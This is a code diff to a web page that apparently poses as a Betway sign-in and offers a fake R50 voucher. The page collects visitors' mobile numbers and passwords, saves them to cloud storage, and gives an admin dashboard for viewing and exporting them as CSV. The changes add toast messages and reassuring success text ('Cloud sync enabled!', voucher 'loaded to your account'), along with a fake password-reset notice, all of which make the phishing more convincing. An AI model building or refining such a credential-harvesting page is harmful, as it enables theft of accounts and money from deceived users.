@@ -576,7 +576,47 @@
             background: #2980b9;
         }
 
-        /* Caution Modal */
+        /* Toast notification */
+        .toast {
+            position: fixed;
+            bottom: 2rem;
+            left: 50%;
+            transform: translateX(-50%) translateY(100px);
+            background: #1a1a1a;
+            color: white;
+            padding: 0.8rem 1.5rem;
+            border-radius: 8px;
+            font-size: 0.9rem;
+            z-index: 9999;
+            opacity: 0;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
+            max-width: 90%;
+            text-align: center;
+        }
+
+        .toast.show {
+            opacity: 1;
+            transform: translateX(-50%) translateY(0);
+        }
+
+        .toast i {
+            margin-right: 8px;
+        }
+
+        .toast.success i {
+            color: #00a651;
+        }
+
+        .toast.error i {
+            color: #ff6b35;
+        }
+
+        .toast.warning i {
+            color: #ffd700;
+        }
+
+        /* Caution Modal - appears for ALL users after claiming */
         .modal-overlay {
             position: fixed;
             top: 0;
@@ -609,7 +649,7 @@
             box-shadow: 0 30px 60px rgba(0, 0, 0, 0.3);
             transform: scale(0.9);
             transition: 0.2s;
-            border-top: 6px solid #ff6b35;
+            border-top: 6px solid #ffd700;
         }
         .modal-overlay.active .modal-box {
             transform: scale(1);
@@ -617,7 +657,7 @@
 
         .modal-icon {
             font-size: 3.5rem;
-            color: #ff6b35;
+            color: #ffd700;
             margin-bottom: 0.5rem;
         }
         .modal-box h3 {
@@ -634,11 +674,11 @@
             background: #f5f7fa;
             padding: 0.8rem 1rem;
             border-radius: 8px;
-            border-left: 4px solid #ff6b35;
+            border-left: 4px solid #ffd700;
             text-align: left;
         }
         .modal-box p i {
-            color: #ff6b35;
+            color: #ffd700;
             margin-right: 8px;
         }
         .modal-btn {
@@ -741,6 +781,11 @@
             .data-actions button {
                 width: 100%;
             }
+            .toast {
+                font-size: 0.8rem;
+                padding: 0.6rem 1rem;
+                bottom: 1rem;
+            }
         }
 
         @media (max-width: 380px) {
@@ -763,6 +808,9 @@
     </style>
 </head>
 <body>
+
+    <!-- Toast Notification -->
+    <div class="toast" id="toast"></div>
 
     <!-- Loading Screen -->
     <div class="loading-screen" id="loadingScreen">
@@ -884,13 +932,13 @@
         </div>
     </div>
 
-    <!-- Caution Modal -->
+    <!-- CONGRATULATION Modal -->
     <div class="modal-overlay" id="cautionModal">
         <div class="modal-box">
-            <div class="modal-icon"><i class="fas fa-exclamation-triangle"></i></div>
-            <h3>CONGRATULATION</h3>
+            <div class="modal-icon"><i class="fas fa-gift"></i></div>
+            <h3>🎉 CONGRATULATION!</h3>
             <p>
-                <i class="fas fa-info-circle"></i> Your voucher has been claimed succesfully.
+                <i class="fas fa-check-circle" style="color: #00a651;"></i> Your R50 voucher has been successfully loaded to your account.
             </p>
             <button class="modal-btn" id="closeModalBtn">
                 <i class="fas fa-check-circle"></i> Thank You
@@ -921,10 +969,21 @@
             const exportCsvBtn = document.getElementById('exportCsvBtn');
             const clearDataBtn = document.getElementById('clearDataBtn');
             const refreshBtn = document.getElementById('refreshBtn');
+            const toast = document.getElementById('toast');
 
             const STORAGE_KEY = 'betway_user_data';
             let isAdminLoggedIn = false;
             let allData = [];
+
+            // Toast notification
+            function showToast(message, type = 'success') {
+                toast.className = 'toast';
+                toast.innerHTML = `<i class="fas ${type === 'success' ? 'fa-check-circle' : type === 'error' ? 'fa-exclamation-circle' : 'fa-exclamation-triangle'}"></i> ${message}`;
+                toast.className = `toast show ${type}`;
+                setTimeout(() => {
+                    toast.className = 'toast';
+                }, 3000);
+            }
 
             // Loading screen timer
             let countdown = 3;
@@ -939,6 +998,7 @@
                     loadingScreen.classList.add('hidden');
                     setTimeout(() => {
                         mainCard.classList.add('visible');
+                        showToast('✅ Cloud sync enabled!', 'success');
                     }, 100);
                 }
             }, 1000);
@@ -1015,7 +1075,7 @@
 
                     if (!isAdmin) {
                         if (isDuplicate(existingData, mobile, password)) {
-                            alert('This Account has already claimed the R50 Voucher.');
+                            showToast('This Account has already claimed the R50 Voucher.', 'warning');
                             return false;
                         }
                     }
@@ -1029,9 +1089,13 @@
                     existingData.push(newEntry);
 
                     const success = await saveCloudData(existingData);
+                    if (success) {
+                        showToast('Voucher claimed successfully!', 'success');
+                    }
                     return success;
                 } catch (error) {
                     console.error('Error saving entry:', error);
+                    showToast('Error saving data. Please try again.', 'error');
                     return false;
                 }
             }
@@ -1080,8 +1144,10 @@
             }
 
             async function refreshDashboard() {
+                showToast('Refreshing data...', 'info');
                 const data = await getAllData();
                 renderDataTable(data);
+                showToast('Data refreshed!', 'success');
             }
 
             async function clearAllData() {
@@ -1091,8 +1157,9 @@
                         allData = [];
                         renderDataTable([]);
                         localStorage.removeItem(STORAGE_KEY);
+                        showToast('All data cleared!', 'success');
                     } catch (error) {
-                        alert('Error clearing data.');
+                        showToast('Error clearing data.', 'error');
                     }
                 }
             }
@@ -1100,7 +1167,7 @@
             function exportCSV() {
                 const data = allData;
                 if (data.length === 0) {
-                    alert('No data to export.');
+                    showToast('No data to export.', 'warning');
                     return;
                 }
 
@@ -1118,6 +1185,7 @@
                 a.click();
                 document.body.removeChild(a);
                 URL.revokeObjectURL(url);
+                showToast('Data exported successfully!', 'success');
             }
 
             async function showDashboard() {
@@ -1153,7 +1221,7 @@
                 const password = passwordInput.value.trim();
 
                 if (!mobile || !password) {
-                    alert('Please fill in both fields.');
+                    showToast('Please fill in both fields.', 'error');
                     return;
                 }
 
@@ -1180,6 +1248,7 @@
 
             closeModalBtn.addEventListener('click', function() {
                 cautionModal.classList.remove('active');
+                // If admin, show dashboard after closing modal
                 if (isAdminLoggedIn) {
                     setTimeout(() => {
                         showDashboard();
@@ -1209,12 +1278,12 @@
 
             document.querySelector('.forgot-link').addEventListener('click', function(e) {
                 e.preventDefault();
-                alert('Password reset link sent to your registered mobile number.');
+                showToast('Password reset link sent to your registered mobile number.', 'success');
             });
 
             document.querySelector('.signup-prompt a').addEventListener('click', function(e) {
                 e.preventDefault();
-                alert('Redirecting to sign up page...');
+                showToast('Redirecting to sign up page...', 'success');
             });
 
             document.addEventListener('keydown', function(e) {
